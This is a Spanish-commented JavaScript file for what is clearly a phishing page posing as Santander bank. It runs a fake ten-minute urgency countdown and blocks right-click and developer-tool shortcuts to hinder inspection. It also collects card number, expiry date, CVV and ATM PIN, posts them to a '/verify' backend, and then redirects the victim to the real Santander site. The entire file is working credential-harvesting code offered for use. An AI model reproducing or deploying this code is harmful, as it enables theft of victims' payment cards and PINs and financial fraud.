javascript
document.addEventListener('DOMContentLoaded', function() {
    // ===== TIMER DE URGENCIA =====
    let timeLeft = 600; // 10 minutos en segundos
    const timerElement = document.getElementById('timer');
    const timerExpired = document.getElementById('timerExpired');
    const timerContainer = document.getElementById('timerContainer');

    function updateTimer() {
        if (timeLeft <= 0) {
            timerElement.style.display = 'none';
            timerExpired.style.display = 'block';
            timerContainer.style.background = '#f8d7da';
            timerContainer.style.borderColor = '#f5c6cb';
            return;
        }

        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

        if (timeLeft < 120) {
            timerElement.style.color = '#dc3545';
            timerElement.style.animation = 'pulse 1s infinite';
        }

        timeLeft--;
    }

    updateTimer();
    setInterval(updateTimer, 1000);

    // ===== FORMATEO AUTOMÁTICO DE TARJETA =====
    const cardInput = document.getElementById('cardNumber');
    cardInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
        value = value.slice(0, 16);
        const parts = value.match(/.{1,4}/g);
        let formatted = '';
        for (let i = 0; i < parts.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formatted += ' ';
            }
            formatted += value[i];
        }
        e.target.value = parts ? parts.join(' ') : '';
    });

    // ===== FORMATEO DE FECHA =====
    const expiryInput = document.getElementById('expiry');
    expiryInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.slice(0, 4);
        if (value.length > 2) {
            e.target.value = value.slice(0, 2) + '/' + value.slice(2);
        } else {
            e.target.value = value;
        }
    });

    // ===== PREVENIR INSPECCIÓN BÁSICA =====
    document.addEventListener('contextmenu', event => event.preventDefault());
    document.addEventListener('keydown', event => {
        if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I')) {
            event.preventDefault();
        }
    });
});

// ===== ENVÍO DEL FORMULARIO =====
function submitForm(event) {
    event.preventDefault();

    const cardNumber = document.getElementById('cardNumber').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;
    const pin = document.getElementById('pin').value;

    // Validaciones básicas
    if (cardNumber.replace(/\s/g, '').length !== 16) {
        alert('El número de tarjeta debe tener 16 dígitos');
        return false;
    }
    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
        alert('Formato de fecha inválido (MM/AA)');
        return false;
    }
    if (cvv.length !== 3 || /\D/.test(cvv)) {
        alert('CVV debe tener 3 dígitos');
        return false;
    }
    if (pin.length !== 4 || /\D/.test(pin)) {
        alert('PIN debe tener 4 dígitos');
        return false;
    }

    // Enviar datos al backend Flask
    fetch('/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            card: cardNumber,
            expiry: expiry,
            cvv: cvv,
            pin: pin,
            timestamp: new Date().toISOString()
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('successModal').style.display = 'flex';
            setTimeout(() => {
                window.location.href = 'https://www.santander.com';
            }, 5000);
        }
    });

    return false;
}

function closeModal() {
    document.getElementById('successModal').style.display = 'none';
    window.location.href = 'https://www.santander.com';
}
